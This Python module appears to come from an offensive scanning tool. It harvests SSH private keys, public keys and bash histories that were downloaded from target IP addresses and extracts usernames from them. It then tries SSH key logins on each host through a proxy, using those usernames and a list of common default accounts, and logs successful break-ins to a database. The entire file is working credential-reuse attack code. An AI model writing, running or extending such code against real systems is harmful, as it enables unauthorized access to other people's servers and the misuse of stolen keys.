"""SSH key processor for parsing and testing downloaded SSH keys."""
import os
import sqlite3

from executors.ssh_walker import Target as SSHTarget
from parsers.parser_helpers import get_directories
from parsers.parser_helpers import test_ipaddress
from parsers.parser_helpers import test_directory
from parsers.parser_helpers import ensure_downloads


def get_ssh_files(file_list: list):
    """Get all file paths containing .ssh directory."""
    ssh_files = []
    for file in file_list:
        posix_path_str = str(file)
        parts = posix_path_str.split("/")
        if ".ssh" in parts:
            if test_directory(file):
                continue
            ssh_files.append(file)
    return ssh_files


def get_bash_history_files(file_list: list):
    """Get all bash history files from the file list."""
    bash_hist_files = []
    for file in file_list:
        posix_path_str = str(file)
        parts = posix_path_str.split("/")
        is_bash_hist = (
            len(parts) > 2 and parts[0] == "home" and parts[2] == ".bash_history"
        ) or (
            len(parts) > 3 and parts[1] == "home" and parts[3] == ".bash_history"
        )
        if is_bash_hist:
            if test_directory(file):
                continue
            bash_hist_files.append(posix_path_str)
    return bash_hist_files


def get_private_key(ssh_files: list):
    """Identify private key files by checking for PEM header."""
    private_keys_found = []
    for file in ssh_files:
        with open(file, "r", encoding="utf-8") as fp:
            top_line = fp.readline()
            if "-----" in top_line:
                private_keys_found.append(file)
    return private_keys_found


def get_public_keys(ssh_files: list):
    """Get public keys from authorized_keys or .pub files."""
    public_keys_found = []
    for file in ssh_files:
        str_file_path = str(file)
        filename = str_file_path.rsplit("/", maxsplit=1)[-1]
        if filename == "authorized_keys":
            public_keys_found.append(file)
        elif ".pub" in filename:
            public_keys_found.append(file)
    return public_keys_found


def get_username_from_file_contents(contents: list):
    """Extract usernames from SSH public key file contents."""
    valid_usernames = set()
    blacklist = ["generated-by-azure", "imported-openssh-key"]
    for line in contents:
        sanitized_line = [x.strip() for x in line.split() if x]
        if len(sanitized_line) < 3:
            continue
        username = sanitized_line[-1]
        if username in blacklist:
            continue
        if "@" in username:
            valid_usernames.add(username.split("@")[0])
        else:
            valid_usernames.add(username)
    return valid_usernames


def get_username_from_bash_history(contents: list):
    """Extract potential usernames from bash history cd commands."""
    valid_usernames = set()
    for line in contents:
        line_parts = line.split(" ")
        if line_parts[0] != "cd":
            continue
        if len(line_parts) == 1:
            continue
        path_parts = line_parts[1].split("/")
        if path_parts[0] == "":
            username = path_parts[2]
        else:
            username = path_parts[1]
        valid_usernames.update(username)
    return valid_usernames


def get_contents_from_pub_keys(public_keys: list):
    """Extract usernames from all public key files."""
    all_usernames = set()
    for file in public_keys:
        with open(file, "r", encoding="utf-8") as fp:
            file_lines = fp.readlines()
        all_usernames.update(get_username_from_file_contents(file_lines))
    return all_usernames


def get_content_from_bash_histories(bash_file_files: list):
    """Extract usernames from all bash history files."""
    all_usernames = set()
    for file in bash_file_files:
        with open(file, "r", encoding="utf-8") as fp:
            file_lines = fp.readlines()
        all_usernames.update(get_username_from_bash_history(file_lines))
    return all_usernames


def get_all_targets(proxy_host_port: str):
    """Process all downloaded targets and attempt SSH access."""
    if not ensure_downloads():
        print(
            "[-] No downloads directory found. Run a scan with -e first to download files."
        )
        return
    for target in os.listdir("downloads"):
        if not test_ipaddress(target):
            continue
        downloaded_files = get_directories(os.path.join("downloads", target))
        ssh_files = get_ssh_files(downloaded_files)
        bash_hist_files = get_bash_history_files(downloaded_files)
        if len(ssh_files) == 0 and len(bash_hist_files) == 0:
            continue
        bash_hist_usernames = get_content_from_bash_histories(bash_hist_files)
        list_of_private_keys = get_private_key(ssh_files)
        list_of_public_keys = get_public_keys(ssh_files)
        usernames_ssh_keys = get_contents_from_pub_keys(list_of_public_keys)
        usernames_comb = usernames_ssh_keys.union(bash_hist_usernames)
        do_executor(target, usernames_comb, list_of_private_keys, proxy_host_port)


def do_executor(
    target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str
):
    """Attempt SSH connections using discovered keys and usernames."""
    usernames = [
        "root",
        "admin",
        "test",
        "guest",
        "info",
        "adm",
        "mysql",
        "user",
        "ubuntu",
        "administrator",
        "oracle",
        "ftp",
        "pi",
        "debian",
        "ansible",
        "ec2-user",
        "vagrant",
        "azureuser",
    ]
    if ":" in target:
        target = target.split(":")[0]
    comb_usernames = list(usernames_from_pub_keys) + usernames
    for priv_key in priv_keys:
        os.chmod(priv_key, 0o600)
        for name in comb_usernames:
            ssh_target = SSHTarget(
                proxy_host_port, target, 22, name, key=str(priv_key)
            )
            print(
                f"[*] {proxy_host_port} -> {ssh_target.username}@"
                f"{ssh_target.host}:{ssh_target.port} {ssh_target.key}"
            )
            client, sock = ssh_target.create_client()
            if sock is None:
                os.remove(priv_key)
                return
            if ssh_target.connect_key(client, sock):
                write_accessed_host(
                    ssh_target.host,
                    ssh_target.port,
                    ssh_target.username,
                    ssh_target.key,
                )
                return
        os.remove(priv_key)


def write_accessed_host(host: str, port: int, username: str, key: str):
    """Record successful SSH access to the database."""
    conn = sqlite3.connect("db/database.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)",
        (host, port, username, key),
    )
    conn.commit()
    conn.close()
